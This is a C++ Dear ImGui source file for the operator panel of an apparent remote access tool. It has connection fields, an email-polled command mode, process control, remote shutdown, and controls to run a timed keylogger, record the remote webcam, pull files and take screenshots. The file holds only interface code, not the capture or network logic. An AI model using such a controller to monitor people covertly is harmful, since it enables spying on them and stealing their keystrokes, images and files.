#include "RemoteAdminUI.h"

void RemoteAdminUI::Render() { 
    // Create fullscreen window
    ImGui::Begin("Remote Administration Client", nullptr, 
                 ImGuiWindowFlags_NoResize | 
                 ImGuiWindowFlags_NoMove | 
                 ImGuiWindowFlags_NoCollapse);
    
    // Get available content region
    ImVec2 contentRegion = ImGui::GetContentRegionAvail();
    float leftColumnWidth = contentRegion.x * 0.5f; // 50% for controls
    float rightColumnWidth = contentRegion.x * 0.5f; // 50% for results display
    
    // Left Column - Control Panel
    if (ImGui::BeginChild("ControlPanel", ImVec2(leftColumnWidth, 0), true)) {
        RenderConnectionPanel();
        RenderModeSwitch();
        
        if (currentMode == UIMode::EMAIL) {
            RenderEmailMode();
        } else {
            RenderManualMode();
        }
        
        RenderResults();
    }
    ImGui::EndChild();
    
    // Separator between columns
    ImGui::SameLine();
    
    // Right Column - File Display
    if (ImGui::BeginChild("FileDisplay", ImVec2(rightColumnWidth, 0), true)) {
        RenderFileDisplay();
    }
    ImGui::EndChild();
    
    ImGui::End();
}

void RemoteAdminUI::RenderVideoControls() {
    if (!isVideoPlaying) return;
    
    ImGui::Separator();
    
    // Play/Pause button
    if (ImGui::Button(isVideoPaused ? "Play" : "Pause")) {
        PlayPauseVideo();
    }
    
    ImGui::SameLine();
    if (ImGui::Button("End")) {
        StopVideo();
    }
    
    // Progress bar
    ImGui::SameLine();
    float progress = ((videoFrameCount > 0) ? (float)currentVideoFrame / videoFrameCount : 0.0f);
    float progressPercent = progress*100;

    ImGui::PushItemWidth(500);
    if (ImGui::SliderFloat("##Progress", &progressPercent, 0.0f, 100.0f, "%.1f%%")) {
        int targetFrame = static_cast<int>(progress * videoFrameCount);
        SeekVideo(targetFrame);
    }
    ImGui::PopItemWidth();
    
    // Frame info
    ImGui::SameLine();
    ImGui::Text("Frame: %d/%d", currentVideoFrame, videoFrameCount);
}

void RemoteAdminUI::RenderFileDisplay() {
    ImGui::Text("Command Result Display");
    ImGui::Separator();
    
    // Update video frame if playing
    UpdateVideoFrame();
    
    // Display current result file if available
    if (currentResultTexture != 0) {
        // Show image/video
        ImVec2 imageSize = CalculateImageSize(currentResultWidth, currentResultHeight);
        ImGui::Image((void*)(intptr_t)currentResultTexture, imageSize);
        
        // Show video controls if it's a video
        if (isVideoPlaying) {
            RenderVideoControls();
        }
        
        // Show file info
        ImGui::Separator();
        ImGui::Text("File: %s", currentResultFileName.c_str());
        ImGui::Text("Size: %dx%d", currentResultWidth, currentResultHeight);
        
        if (isVideoPlaying) {
            ImGui::Text("FPS: %.1f", videoFPS);
            ImGui::Text("Status: %s", isVideoPaused ? "Paused" : "Playing");
        }
        
    } else if (!currentResultText.empty()) {
        // Show text result (for keylogger, process lists, etc.)
        if (ImGui::BeginChild("TextResult", ImVec2(0, 0), true)) {
            ImGui::TextWrapped("%s", currentResultText.c_str());
        }
        ImGui::EndChild();
        
    } else {
        // No result to display
        ImGui::TextColored(ImVec4(0.7f, 0.7f, 0.7f, 1.0f), "No result to display");
        ImGui::TextWrapped("Execute a command to see results here");
    }
}

// Helper function to calculate appropriate image size for display
ImVec2 RemoteAdminUI::CalculateImageSize(int imageWidth, int imageHeight) {
    if (imageWidth == 0 || imageHeight == 0) {
        return ImVec2(0, 0);
    }
    
    ImVec2 availableSize = ImGui::GetContentRegionAvail();
    
    // Leave some space for file info below
    availableSize.y -= 80;
    
    float aspectRatio = (float)imageWidth / (float)imageHeight;
    
    // Calculate size while maintaining aspect ratio
    float displayWidth = availableSize.x - 20; // Some padding
    float displayHeight = displayWidth / aspectRatio;
    
    // If height is too large, scale down
    if (displayHeight > availableSize.y) {
        displayHeight = availableSize.y;
        displayWidth = displayHeight * aspectRatio;
    }
    
    return ImVec2(displayWidth, displayHeight);
}

void RemoteAdminUI::RenderConnectionPanel() {
    if (ImGui::CollapsingHeader("Connection", ImGuiTreeNodeFlags_DefaultOpen)) {
        ImGui::PushItemWidth(300);
        
        ImGui::BeginDisabled(isConnected);
        ImGui::InputText("Server IP", serverIP, sizeof(serverIP));
        ImGui::SameLine();
        ImGui::InputText("Port", serverPort, sizeof(serverPort));
        ImGui::EndDisabled();
        
        ImGui::SameLine();
        if (ImGui::Button(isConnected ? "Disconnect" : "Connect")) {
            HandleConnect();
        }
        
        ImGui::PopItemWidth();
        
        // Status indicator
        ImGui::Text("Status: ");
        ImGui::SameLine();
        ImGui::PushStyleColor(ImGuiCol_Text, isConnected ? Colors::SUCCESS : Colors::FAULT);
        ImGui::Text("%s", connectionStatus.c_str());
        ImGui::PopStyleColor();
    }
}

void RemoteAdminUI::RenderModeSwitch() {
    if (ImGui::CollapsingHeader("Mode Selection", ImGuiTreeNodeFlags_DefaultOpen)) {
        ImGui::BeginDisabled(activeCommand != CommandState::IDLE);
        
        if (ImGui::RadioButton("Email Mode", currentMode == UIMode::EMAIL)) {
            currentMode = UIMode::EMAIL;
            lastCheckTime = std::chrono::steady_clock::now() - std::chrono::seconds(15);
        }
        
        ImGui::SameLine();
        
        if (ImGui::RadioButton("Manual Mode", currentMode == UIMode::MANUAL)) {
            currentMode = UIMode::MANUAL;
        }
        
        ImGui::EndDisabled();
        
        if (activeCommand != CommandState::IDLE) {
            ImGui::PushStyleColor(ImGuiCol_Text, Colors::WARNING);
            ImGui::Text("Command is running... Please wait.");
            ImGui::PopStyleColor();
        }
    }
}

void RemoteAdminUI::RenderEmailMode() {
    // Update email checking
    CheckEmailAutomatically();
    if (ImGui::CollapsingHeader("Email Command Monitor", ImGuiTreeNodeFlags_DefaultOpen)) {
        ImGui::Text("Last Check: %s", lastEmailCheck.c_str());
        ImGui::Text("Status: %s", emailStatus.c_str());
        ImGui::Separator();
        ImGui::TextWrapped("Automatically checking for email commands every 5 seconds...");
    }
}

void RemoteAdminUI::RenderProcessManagement() {
    if (ImGui::TreeNode("Process Management")) {

        // List all running processes
        if (ImGui::Button("List Processes")) {
            ExecuteCommand(CommandState::LIST_PROCESSES);
        }
        if (ImGui::IsItemHovered())
            ImGui::SetTooltip("Display a list of all currently running processes");

        // Input: process name
        ImGui::PushItemWidth(200);
        ImGui::InputText("Process Name", processName, sizeof(processName));
        if (ImGui::IsItemHovered())
            ImGui::SetTooltip("Enter the exact name of the process (e.g., notepad.exe)");
        ImGui::PopItemWidth();

        // Start / Kill process
        ImGui::SameLine();
        ImGui::BeginDisabled(strlen(processName) == 0);
        if (ImGui::Button("Start##Process")) {
            ExecuteCommand(CommandState::START_PROCESS);
        }
        if (ImGui::IsItemHovered())
            ImGui::SetTooltip("Start the specified process by name");

        ImGui::SameLine();
        if (ImGui::Button("Kill##Process")) {
            ExecuteCommand(CommandState::KILL_PROCESS);
        }
        if (ImGui::IsItemHovered())
            ImGui::SetTooltip("Forcefully terminate the specified process");
        ImGui::EndDisabled();

        ImGui::TreePop();
    }
}

void RemoteAdminUI::RenderApplicationManagement() {
    if (ImGui::TreeNode("Application Management")) {

        // List installed applications
        if (ImGui::Button("List Apps")) {
            ExecuteCommand(CommandState::LIST_APPS);
        }
        if (ImGui::IsItemHovered())
            ImGui::SetTooltip("Display a list of installed applications");

        // Input: application name
        ImGui::PushItemWidth(200);
        ImGui::InputText("Application Name", appName, sizeof(appName));
        if (ImGui::IsItemHovered())
            ImGui::SetTooltip("Enter the exact name of the application");
        ImGui::PopItemWidth();

        // Start / Stop application
        ImGui::SameLine();
        ImGui::BeginDisabled(strlen(appName) == 0);
        if (ImGui::Button("Start##App")) {
            ExecuteCommand(CommandState::START_APP);
        }
        if (ImGui::IsItemHovered())
            ImGui::SetTooltip("Launch the specified application");

        ImGui::SameLine();
        if (ImGui::Button("Stop##App")) {
            ExecuteCommand(CommandState::STOP_APP);
        }
        if (ImGui::IsItemHovered())
            ImGui::SetTooltip("Stop the specified application");
        ImGui::EndDisabled();

        ImGui::TreePop();
    }
}

void RemoteAdminUI::RenderSystemCommands() {
    if (ImGui::TreeNode("System Commands")) {

        // Shutdown system
        if (ImGui::Button("Shutdown")) {
            ExecuteCommand(CommandState::SHUTDOWN);
        }
        if (ImGui::IsItemHovered())
            ImGui::SetTooltip("Turn off the remote device");

        ImGui::SameLine();
        if (ImGui::Button("Restart")) {
            ExecuteCommand(CommandState::RESTART);
        }
        if (ImGui::IsItemHovered())
            ImGui::SetTooltip("Restart the remote device");

        ImGui::TreePop();
    }
}

void RemoteAdminUI::RenderMonitoringAndFiles() {
    if (ImGui::TreeNode("Monitoring & Files")) {

        // --- Keylogger ---
        ImGui::SeparatorText("Keylogger");
        ImGui::Text("Record keyboard activity remotely.");
        ImGui::PushItemWidth(200);
        ImGui::InputInt("Duration (seconds)", &keyloggerDuration);
        ImGui::PopItemWidth();
        ImGui::SameLine();
        if (ImGui::Button("Start Keylogger")) {
            std::cout << "oe oe\n";
            ExecuteCommand(CommandState::KEYLOGGER);
        }
        if (ImGui::IsItemHovered()) {
            ImGui::SetTooltip("Starts recording keystrokes for the set duration.");
        }

        // --- Webcam ---
        ImGui::SeparatorText("Webcam");
        ImGui::Text("View or record video from remote webcam.");
        if (ImGui::Button("Start Webcam")) {
            ExecuteCommand(CommandState::START_WEBCAM);
        }
        if (ImGui::IsItemHovered()) {
            ImGui::SetTooltip("Start recording webcam.");
        }

        ImGui::SameLine();
        if (ImGui::Button("Stop Webcam")) {
            ExecuteCommand(CommandState::STOP_WEBCAM);
        }
        if (ImGui::IsItemHovered()) {
            ImGui::SetTooltip("Stop recording webcam.");
        }

        // --- File operations ---
        ImGui::SeparatorText("File Operations");
        ImGui::PushItemWidth(300);
        ImGui::InputText("File Path", filePath, sizeof(filePath));
        if (ImGui::IsItemHovered())
        ImGui::SetTooltip("Enter the exact path of the file (e.g., C:/screenshot.png)");
        ImGui::PopItemWidth();
        ImGui::SameLine();
        ImGui::BeginDisabled(strlen(filePath) == 0);
        if (ImGui::Button("Get File")) {
            ExecuteCommand(CommandState::GET_FILE);
        }
        ImGui::EndDisabled();
        if (ImGui::IsItemHovered()) {
            ImGui::SetTooltip("Get a file from the given path.");
        }

        // --- Screenshot ---
        ImGui::SeparatorText("Screenshot");
        if (ImGui::Button("Take Screenshot")) {
            ExecuteCommand(CommandState::TAKE_SCREENSHOT);
        }
        if (ImGui::IsItemHovered()) {
            ImGui::SetTooltip("Captures a screenshot of the remote screen.");
        }

        ImGui::TreePop();
    }
}


void RemoteAdminUI::RenderManualMode() {
    bool isDisabled = !isConnected || activeCommand != CommandState::IDLE;
    
    if (ImGui::CollapsingHeader("Manual Commands", ImGuiTreeNodeFlags_DefaultOpen)) {
        ImGui::BeginDisabled(isDisabled);
        
        RenderProcessManagement();
        RenderApplicationManagement();
        RenderSystemCommands();
        RenderMonitoringAndFiles();
        
        ImGui::EndDisabled();
    }
}

void RemoteAdminUI::RenderResults() {
    if (ImGui::CollapsingHeader("Results", ImGuiTreeNodeFlags_DefaultOpen)) {
        if (ImGui::BeginChild("ResultsScrolling", ImVec2(0, 300), true)) {
            for (const auto& result : results) {
                ImGui::PushStyleColor(ImGuiCol_Text, result.color);
                ImGui::Text("[%s] %s", result.timestamp.c_str(), result.message.c_str());
                ImGui::PopStyleColor();
            }
            
            // Auto-scroll to bottom
            if (ImGui::GetScrollY() >= ImGui::GetScrollMaxY())
                ImGui::SetScrollHereY(1.0f);
        }
        ImGui::EndChild();
        
        if (ImGui::Button("Clear Results")) {
            results.clear();
        }
    }
}

